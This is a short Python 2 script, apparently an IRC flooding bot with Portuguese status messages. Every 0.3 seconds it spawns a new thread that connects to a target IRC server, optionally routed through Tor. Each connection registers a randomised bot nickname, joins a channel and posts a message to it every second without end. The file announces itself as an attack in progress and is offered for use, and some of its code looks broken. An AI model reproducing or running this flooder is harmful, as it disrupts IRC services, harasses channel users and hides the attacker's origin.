#! /bin/python2
# encoding: utf-8
from argv import *
import socket, socks
import random, time
import ssl
import thread
cont1 = 0
def lancadora():
	while True:
		time.sleep(0.3)
		thread.start_new_thread(connect,(server, port, canal, botname, botmsg,))

def connect(server, port, vt, user, msg):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if ssl == 1:	
		sock = ssl.wrap_socket(sock)
	if tor == 1:
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
		sock = socks.socksocket()
	try:
		sock.connect((server, port))
	except socket.error,e:
		if "Connection refused" in e:
			print "[ERRO] Conexão falhou"
			quit()
		elif "Name or service not known" in e:
			print "[ERRO] Nome ou serviço desconhecido"
			quit()
	thread.start_new_thread(lancadora,())
	cont1 = 1
	user = user + str(random.randrange(0,300))
	sock.send ('USER ' + user + ' ' + user + ' ' + user + ' .:\n')
	time.sleep(2)
	sock.send("NICK %s\r\n" %user)
	time.sleep(2)
	sock.send('Join #%s \r\n' %vt)
	time.sleep(4)
	while 1:
		time.sleep(1)
		sock.send("PRIVMSG #%s : %s \n" %(vt, msg)) 

if tor == 1:
	print "[!] O tor tem que está instalado na sua maquina"
print "Ataque em andamento..."
connect(server, port, canal, botname, botmsg)

